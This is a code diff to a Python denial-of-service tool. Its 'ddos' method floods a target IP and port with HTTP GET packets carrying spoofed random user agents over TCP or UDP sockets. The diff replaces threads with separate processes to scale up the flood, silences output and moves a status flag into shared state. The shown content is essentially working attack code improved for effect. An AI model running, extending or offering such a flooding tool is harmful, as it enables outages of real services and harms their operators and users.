@@ -9,7 +9,8 @@ import socket
 from os import getcwd, name, path, system
 from random import choice
 from sys import version
-from threading import Thread
+# from threading import Thread
+from multiprocessing import Process
 from time import sleep, time
 
 import requests
@@ -41,7 +42,7 @@ class Main:
 		var.ip = [""]
 		var.socketmethod = "TCP"  # / UDP
 		var.sleep = 0
-		var.outtxt = True
+		var.outtxt = False
 		var.outtxtmute = False
 		var.message = "hey, it's me rs."
 		var.messagezw = var.message
@@ -57,6 +58,8 @@ class Main:
 
 		var.l4_debug = False
 		var.stoped_threads = 0
+
+		var.mesalready = False
 
 		var.user_agents = ["Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/4.0; InfoPath.2; SV1; .NET CLR 2.0.50727; WOW64)", "Mozilla/5.0 (Linux; U; Android 2.3; en-us) AppleWebKit/999+ (KHTML, like Gecko) Safari/999.9", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0", "Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3 like Mac OS X; pl-pl) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8F190 Safari/6533.18.5", "Mozilla/5.0 (Windows NT 6.0; WOW64; rv:24.0) Gecko/20100101 Firefox/24.0", "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.0) Gecko/20100101 Firefox/25.0", "Mozilla/5.0 (X11; NetBSD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36", "Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_2_1 like Mac OS X; nb-no) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148a Safari/6533.18.5", "Opera/9.80 (Windows NT 6.1; U; pl) Presto/2.7.62 Version/11.00", "Mozilla/5.0 (Windows NT 6.1; rv:27.3) Gecko/20130101 Firefox/27.3", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246", "Mozilla/5.0 (Windows; U; MSIE 9.0; WIndows NT 9.0; en-US))", "Opera/9.80 (Windows NT 6.1; U; zh-cn) Presto/2.6.37 Version/11.00", "Opera/9.80 (Windows NT 6.1; U; ko) Presto/2.7.62 Version/11.00", "Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:24.0) Gecko/20100101 Firefox/24.0", "Mozilla/5.0 (Windows NT 6.1; U; de; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 11.01", "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.90 Safari/537.36", "Mozilla/5.0 (compatible; MSIE 10.0; Macintosh; Intel Mac OS X 10_7_3; Trident/6.0)", "Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3 like Mac OS X; fr-fr) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8F190 Safari/6533.18.5", "Mozilla/5.0 (iPhone; U; ru; CPU iPhone OS 4_2_1 like Mac OS X; fr) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148a Safari/6533.18.5", "Opera/9.80 (X11; Linux x86_64; U; pl) Presto/2.7.62 Version/11.00", "Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3 like Mac OS X; en-gb) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8F190 Safari/6533.18.5", "Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30", "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)", "Opera/9.80 (X11; Linux i686; U; it) Presto/2.7.62 Version/11.00", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:24.0) Gecko/20100101 Firefox/24.0", "Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:27.0) Gecko/20121011 Firefox/27.0", "Mozilla/5.0 (Linux; U; Android 4.0.3; de-ch; HTC Sensation Build/IML74K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30", "Mozilla/1.22 (compatible; MSIE 10.0; Windows 3.1)", "Mozilla/5.0 (X11; CrOS i686 3912.101.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36", "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; de) Opera 11.01", "Mozilla/5.0 (iPhone; U; fr; CPU iPhone OS 4_2_1 like Mac OS X; fr) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148a Safari/6533.18.5", "Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_2_1 like Mac OS X; ru-ru) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5", "Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_1 like Mac OS X; zh-tw) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8G4 Safari/6533.18.5"]
 
@@ -438,7 +441,7 @@ C_B----------------------------------------------------------C_W""").replace("C_
 		while True:
 			for thread in range(var.threads):
 				try:
-					t = Thread(target=self.ddos)
+					t = Process(target=self.ddos)
 					t.start()
 				except Exception:
 					print("\x1b[0;39mFailed to start a thread.")
@@ -453,10 +456,9 @@ C_B----------------------------------------------------------C_W""").replace("C_
 				var.stresstestvar += 1
 
 	def ddos(self):
-		mesalready = False
 		if var.get_url == "":
 			var.get_url = var.ip
-		packet = ("GET /%s HTTP/1.1\r\nHost: %s\r\n User-Agent: %s\r\nConnection: Keep-Alive\r\nAccept-Language: en-us\r\nAccept-Encoding: gzip, deflate\r\n%s\r\n\r\n" % (var.get_url, var.ip, choice(var.user_agents), var.message)).encode("utf-8")
+		packet = ("GET /%s HTTP/1.1\r\nHost: %s\r\n User-Agent: %s\r\nConnection: Keep-Alive\r\nAccept-Language: en-us\r\nAccept-Encoding: gzip, deflate\r\n%s" % (var.get_url, var.ip, choice(var.user_agents), var.message)).encode("utf-8")
 		if not var.outtxtmute:
 			print("Thread started!")
 		if var.socketmethod == "UDP":
@@ -481,14 +483,14 @@ C_B----------------------------------------------------------C_W""").replace("C_
 						except Exception:
 							mysocket.send(packet)
 						if var.outtxt:
-							if not mesalready:
-								mesalready = True
+							if not var.mesalready:
+								var.mesalready = True
 								print("\nSuccess for %s with port %s!" % (ipvalue, portvalue))
 						# sleep(sleepy)
 						var.command_log.append("Sucessful execution.")
 					except socket.error as ex:
 						if not var.outtxtmute:
-							mesalready = False
+							var.mesalready = False
 							print("\nTarget %s with port %s not accepting request!" % (ipvalue, portvalue))
 						var.command_log.append("ERROR: %s" % ex)
 						if var.l4_debug:
@@ -529,7 +531,8 @@ C_B----------------------------------------------------------C_W""").replace("C_
 						var.autostarttime = time()
 					for thread in range(var.threads):
 						try:
-							t = Thread(target=self.ddos)
+							# t = Thread(target=self.ddos)
+							t = Process(target=self.ddos)
 							sleep(var.autostep)
 							t.start()
 						except Exception:
@@ -575,7 +578,7 @@ C_B----------------------------------------------------------C_W""").replace("C_
 							sleep(1)
 				try:
 					if var.server[0] and var.server[0]:
-						rec_t = Thread(target=check_stopped_execution)
+						rec_t = Process(target=check_stopped_execution)
 						rec_t.start()
 					input("\r")
 				except KeyboardInterrupt:
